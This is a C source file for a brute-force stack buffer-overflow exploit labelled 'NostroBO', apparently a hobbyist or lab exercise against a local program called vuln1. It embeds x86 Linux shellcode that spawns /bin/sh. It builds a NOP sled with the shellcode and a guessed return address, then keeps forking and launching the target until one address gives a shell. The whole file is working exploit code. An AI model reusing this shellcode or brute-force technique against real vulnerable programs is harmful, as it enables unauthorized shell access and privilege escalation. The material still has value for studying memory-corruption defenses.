/* gcc -o bruteforce1 bruteforce1.c */
#include <stdlib.h>
#define BUFFER_LEN 100
#define OVERFLOW 8

int main()
{
char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
                   "\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56"
                   "\x0c\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40"
                   "\xcd\x80\xe8\xdc\xff\xff\xff"
                   "/bin/sh";
char newret[] = "\x00\xfc\xff\xbf";          // adresse de depart
char diff[] = "\xff\xff\xff\xbf";          // adresse limite
char buffer[512];
int i;
int j;
int loop;
int pid;
int error;

printf("\n\n=== NostroBO Buffer Overflow ===\n\n");

for (loop = 0; strcmp(diff, newret) > 0; loop++)
  {
     error = 0;

     newret[0] += 1;
     if (newret[0] == '\x00')
       {
          newret[1] += 1;
          newret[0] = '\x00';
          continue;
       }

     printf("\n%d #@! Testing NewRet Address: %s !@# %d\n", loop, newret, loop);

     printf("-> Creating Buffer.\n");

     for (i = 0; i < ((BUFFER_LEN+OVERFLOW)-(2*strlen(newret)+strlen(shellcode))); i++)
          buffer[i] = '\x90';

     printf("hop: %d\n", i);

     for (j = 0; shellcode[j]; j++, i++)
          buffer[i] = shellcode[j];

     printf("-> Shellcode injected.\n");

     printf("hop: %d\n", i);

     for (j = 0; newret[j]; j++, i++)
          buffer[i] = newret[j];

     for (j = 0; newret[j]; j++, i++)
          buffer[i] = newret[j];

     printf("-> Buffer Address injected.\n");

     printf("hop: %d\n", i);

     pid = fork();
     if (pid == -1)
       {
          printf("#@! Fork() Error.\n");
          exit(0);
       }
     else if (pid == 0)
       {
          printf("-> Trying Exploit.\n");
          execl("./vuln1", "vuln1", buffer, NULL);
          exit(0);
       }
     else
          waitpid(pid, &error, 0);

     if (error == 0)
       {
          printf("-> Exploit executed successfuly.\n");
          printf("-> RedKod Rulez.\n");
          return (0);
       }
  }
}
